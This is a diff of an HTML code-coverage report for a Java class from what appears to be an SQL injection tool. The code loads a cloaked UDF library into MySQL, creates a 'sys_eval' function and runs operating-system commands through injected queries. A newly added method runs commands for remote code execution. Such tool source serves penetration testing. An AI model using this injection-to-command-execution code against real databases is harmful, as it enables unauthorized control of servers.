-<span class="fc" id="L232">            return this.getResult(</span>
+<span class="fc" id="L294">            return this.getResult(</span>
                 &quot;select count(table_name) from information_schema.tables &quot; +
                 &quot;where table_type like 'base table' and table_name = '&quot;+ nameTableRandom +&quot;' &quot; +
                 &quot;and table_schema = '&quot; + nameDatabase + &quot;'&quot;,
                 &quot;tbl#check&quot;
             );
-<span class="nc" id="L238">        } catch (JSqlException e) {</span>
-<span class="nc" id="L239">            return e.getMessage();  // error message then logged</span>
+<span class="nc" id="L300">        } catch (JSqlException e) {</span>
+<span class="nc" id="L301">            return e.getMessage();  // error message then logged</span>
         }
     }
 
     private boolean buildSysEval(String nameLibrary) throws JSqlException {
-<span class="fc" id="L244">        this.injectionModel.injectWithoutIndex(&quot;; drop function sys_eval&quot;, &quot;udf#del-func&quot;);</span>
-<span class="fc" id="L245">        this.injectionModel.injectWithoutIndex(</span>
+<span class="fc" id="L306">        this.injectionModel.injectWithoutIndex(&quot;; drop function sys_eval&quot;, &quot;udf#del-func&quot;);</span>
+<span class="fc" id="L307">        this.injectionModel.injectWithoutIndex(</span>
             &quot;; create function sys_eval returns string soname '&quot;+ nameLibrary +&quot;'&quot;,
             &quot;udf#function&quot;
         );
-<span class="fc" id="L249">        var confirm = this.getResult(&quot;select group_concat(name)from mysql.func&quot;, &quot;udf#confirm&quot;);</span>
-<span class="fc bfc" id="L250" title="All 2 branches covered.">        if (!confirm.contains(&quot;sys_eval&quot;)) {</span>
-<span class="fc" id="L251">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Udf failure: sys_eval not found&quot;);</span>
-<span class="fc" id="L252">            return false;</span>
+<span class="fc" id="L311">        var confirm = this.getResult(&quot;select group_concat(name)from mysql.func&quot;, &quot;udf#confirm&quot;);</span>
+<span class="fc bfc" id="L312" title="All 2 branches covered.">        if (!confirm.contains(&quot;sys_eval&quot;)) {</span>
+<span class="fc" id="L313">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;UDF failure: sys_eval not found&quot;);</span>
+<span class="fc" id="L314">            return false;</span>
         }
-<span class="fc" id="L254">        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;Udf successful: sys_eval found&quot;);</span>
+<span class="fc" id="L316">        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, &quot;UDF successful: sys_eval found&quot;);</span>
 
-<span class="fc" id="L256">        var request = new Request();</span>
-<span class="fc" id="L257">        request.setMessage(Interaction.ADD_TAB_EXPLOIT_UDF);</span>
-<span class="fc" id="L258">        request.setParameters(null, null);</span>
-<span class="fc" id="L259">        this.injectionModel.sendToViews(request);</span>
-<span class="fc" id="L260">        return true;</span>
+<span class="fc" id="L318">        var request = new Request();</span>
+<span class="fc" id="L319">        request.setMessage(Interaction.ADD_TAB_EXPLOIT_UDF);</span>
+<span class="fc" id="L320">        request.setParameters(null, null);</span>
+<span class="fc" id="L321">        this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L322">        return true;</span>
+    }
+
+    public String runCommandRce(String command, UUID uuidShell) {
+        String result;
+        try {
+<span class="nc" id="L328">            result = this.getResult(</span>
+<span class="nc" id="L329">                String.format(</span>
+                    &quot;SELECT %s('%s')||'%s' FROM dual&quot;,
+                    UdfAccess.RCE_JAVA_UTIL_FUNC,
+<span class="nc" id="L332">                    command.replace(StringUtils.SPACE, &quot;%20&quot;),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'</span>
+                    VendorYaml.TRAIL_SQL
+                ),
+                &quot;rce#run-cmd&quot;
+            );
+<span class="nc" id="L337">        } catch (JSqlException e) {</span>
+<span class="nc" id="L338">            result = &quot;Command failure: &quot; + e.getMessage() +&quot;\nTry '&quot;+ command.trim() +&quot; 2&gt;&amp;1' to get a system error message.\n&quot;;</span>
+<span class="nc" id="L339">        }</span>
+<span class="nc" id="L340">        var request = new Request();</span>
+<span class="nc" id="L341">        request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);</span>
+<span class="nc" id="L342">        request.setParameters(uuidShell, result);</span>
+<span class="nc" id="L343">        this.injectionModel.sendToViews(request);</span>
+<span class="nc" id="L344">        return result;</span>
     }
 
     public String runCommand(String command, UUID uuidShell) {
         String result;
         try {
-<span class="fc" id="L266">            result = this.getResult(  // 0xff splits single result in many chunks =&gt; replace by space</span>
-                &quot;select cast(replace(sys_eval('&quot;+command+&quot;'),0xff,0x20)as char(70000) character set utf8)&quot;,
+<span class="fc" id="L350">            result = this.getResult(  // 0xff splits single result in many chunks =&gt; replace by space</span>
+                &quot;select cast(replace(sys_eval('&quot;+ command +&quot;'),0xff,0x20)as char(70000) character set utf8)&quot;,
                 &quot;udf#run-cmd&quot;
             );
-<span class="nc" id="L270">        } catch (JSqlException e) {</span>
-<span class="nc" id="L271">            result = &quot;Command failure: &quot; + e.getMessage() +&quot;\nTry '&quot;+ command.trim() +&quot; 2&gt;&amp;1' to get a system error message.\n&quot;;</span>
-<span class="fc" id="L272">        }</span>
-<span class="fc" id="L273">        var request = new Request();</span>
-<span class="fc" id="L274">        request.setMessage(Interaction.GET_EXPLOIT_UDF_RESULT);</span>
-<span class="fc" id="L275">        request.setParameters(uuidShell, result);</span>
-<span class="fc" id="L276">        this.injectionModel.sendToViews(request);</span>
-<span class="fc" id="L277">        return result;</span>
+<span class="nc" id="L354">        } catch (JSqlException e) {</span>
+<span class="nc" id="L355">            result = &quot;Command failure: &quot;+ e.getMessage() +&quot;\nTry '&quot;+ command.trim() +&quot; 2&gt;&amp;1' to get a system error message.\n&quot;;</span>
+<span class="fc" id="L356">        }</span>
+<span class="fc" id="L357">        var request = new Request();</span>
+<span class="fc" id="L358">        request.setMessage(Interaction.GET_EXPLOIT_UDF_RESULT);</span>
+<span class="fc" id="L359">        request.setParameters(uuidShell, result);</span>
+<span class="fc" id="L360">        this.injectionModel.sendToViews(request);</span>
+<span class="fc" id="L361">        return result;</span>
     }
 
     private static List&lt;String&gt; toHexChunks(String filename) throws JSqlException {
         try {
-<span class="fc" id="L282">            byte[] fileData = Objects.requireNonNull(  // getResource &gt; toURI &gt; toPath &gt; readAllBytes() not possible in .jar</span>
-<span class="fc" id="L283">                UdfAccess.class.getClassLoader().getResourceAsStream(&quot;udf/&quot;+ filename +&quot;.cloak&quot;)</span>
-<span class="fc" id="L284">            ).readAllBytes();</span>
-<span class="fc" id="L285">            fileData = StringUtil.uncloak(fileData);</span>
-<span class="fc" id="L286">            return StringUtil.toHexChunks(fileData);</span>
-<span class="nc" id="L287">        } catch (IOException e) {</span>
-<span class="nc" id="L288">            throw new JSqlException(e);</span>
+<span class="fc" id="L366">            byte[] fileData = Objects.requireNonNull(  // getResource &gt; toURI &gt; toPath &gt; readAllBytes() not possible in .jar</span>
+<span class="fc" id="L367">                UdfAccess.class.getClassLoader().getResourceAsStream(&quot;udf/&quot;+ filename +&quot;.cloak&quot;)</span>
+<span class="fc" id="L368">            ).readAllBytes();</span>
+<span class="fc" id="L369">            fileData = StringUtil.uncloak(fileData);</span>
+<span class="fc" id="L370">            return StringUtil.toHexChunks(fileData);</span>
+<span class="nc" id="L371">        } catch (IOException e) {</span>
+<span class="nc" id="L372">            throw new JSqlException(e);</span>
         }
     }
 
     private String getResult(String query, String metadata) throws JSqlException {
-<span class="fc" id="L293">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
-<span class="fc" id="L294">        return new SuspendableGetRows(this.injectionModel).run(</span>
+<span class="fc" id="L377">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
+<span class="fc" id="L378">        return new SuspendableGetRows(this.injectionModel).run(</span>
             query,
             sourcePage,
-<span class="fc" id="L297">            false,</span>
-<span class="fc" id="L298">            0,</span>
+<span class="fc" id="L381">            false,</span>
+<span class="fc" id="L382">            0,</span>
             MockElement.MOCK,
             metadata
         );
